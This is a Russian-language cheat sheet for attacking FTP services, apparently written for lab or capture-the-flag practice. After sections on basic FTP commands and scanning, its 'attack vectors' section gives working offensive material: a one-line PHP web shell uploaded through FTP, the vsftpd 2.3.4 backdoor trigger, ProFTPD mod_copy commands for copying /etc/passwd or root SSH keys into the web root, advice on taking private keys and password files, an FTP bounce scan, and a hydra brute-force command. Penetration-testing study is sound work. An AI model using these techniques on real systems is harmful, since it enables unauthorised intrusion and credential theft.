### 1. Подключение и Разведка (Терминал)

- `ftp IP_АДРЕС` — стандартное подключение.
- `ftp -a IP_АДРЕС` — быстрый анонимный вход (логин: `anonymous`, пароль пустой).
- `nc -vn IP_АДРЕС 21` — чтение баннера через Netcat (выдает точную версию, например _vsftpd 2.3.4_).
- `nmap -sV -sC -p 21 IP_АДРЕС` — стандартный скан с базовыми скриптами (сразу проверит версию и анонимный вход).
- `nmap --script ftp-* -p 21 IP_АДРЕС` — прогнать вообще **все** скрипты для FTP (поиск известных бэкдоров и уязвимостей).
### 2. Навигация внутри оболочки `ftp>`

- `passive` (или `pass`) — **[ВАЖНО]** переключить в пассивный режим. Если при вводе команды `ls` консоль намертво зависает, просто введите `passive` — это обходит проблемы с фаерволом.
- `ls -al` — показать все файлы, включая скрытые (начинаются с точки).
- `cd имя_папки` / `cd ..` — переход по папкам / на уровень выше.
- `pwd` / `lcd /root/` — показать удаленную папку / изменить локальную папку для загрузок.
### 3. Скачивание и Загрузка (CRUD)

- `binary` (или `bin`) — **ОБЯЗАТЕЛЬНО** перед скачиванием архивов, картинок и `.exe`, чтобы не сломать их кодировкой.
- `get файл` / `put файл` — скачать / загрузить один файл.
- `prompt` — отключить запрос `[Y/n]` при массовом скачивании.
- `mget *` / `mput *` — скачать/загрузить всё содержимое папки.
- `wget -m ftp://anonymous:anonymous@IP_АДРЕС` — (из терминала Linux) рекурсивно выкачать весь FTP сервер со всеми папками одной командой.
### 4. Хакерские фишки и Векторы атак (Как ломать)

**Вектор А: FTP + Web (Заливка шелла)** Если FTP-сервер делит одну и ту же папку с веб-сервером (например, вы видите папки `www`, `html`, `htdocs`), и у вас есть права на запись (`put`):

1. Создаем локально файл `shell.php` с кодом: `<?php system($_GET['cmd']); ?>`
2. Загружаем его через FTP: `put shell.php`
3. Открываем в браузере: `http://IP_АДРЕС/shell.php?cmd=id` и получаем выполнение команд на сервере.
**Вектор Б: Эксплуатация известных версий (CVE)** Если `nmap` или `nc` показали конкретную версию сервера, сразу идите в `searchsploit` или Google. Самые частые гости на средних лабах:

- **vsftpd 2.3.4:** Содержит бэкдор. Если при логине ввести смайлик `:)`, на сервере открывается рут-шелл на порту 6200. Ломается через Metasploit (`exploit/unix/ftp/vsftpd_234_backdoor`).
- **ProFTPD 1.3.5 (mod_copy):** Уязвимость позволяет копировать файлы сервера без авторизации. Можно скопировать `/etc/passwd` или приватный SSH-ключ рута в веб-директорию, а потом скачать через браузер.
    - _Команды без авторизации (через nc):_ `SITE CPFR /etc/passwd` (что копируем), затем `SITE CPTO /var/www/html/passwd.txt` (куда копируем).

**Вектор В: Утечки данных (Разведка внутри)** Даже с правами `anonymous` ищите критичные файлы:

- Папка `.ssh/` — скачивайте `id_rsa` (приватный ключ), чтобы зайти по SSH без пароля.
- Файлы `config.php`, `web.config` — в них часто лежат пароли от баз данных (которые подходят и к SSH).
- Файлы `.bash_history` — история команд админа, там часто светятся пароли.

**Вектор Г: FTP Bounce Attack (Проксирование через FTP)** Если сервер уязвим к Bounce-атаке, его можно использовать как прокси для сканирования внутренних портов, которые закрыты фаерволом снаружи.

- Команда: `nmap -Pn -b username:password@IP_FTP_СЕРВЕРА IP_ЦЕЛИ_ДЛЯ_СКАНА`

**Вектор Д: Брутфорс и Сниффинг**

- FTP передает данные в открытом виде (без шифрования). Если у вас есть доступ к сети (или `.pcap` файл на лабе), пароль легко читается через **Wireshark** (фильтр `ftp.auth`).
- Брутфорс: `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP_АДРЕС` (но делайте это в последнюю очередь, так как это шумно и долго).
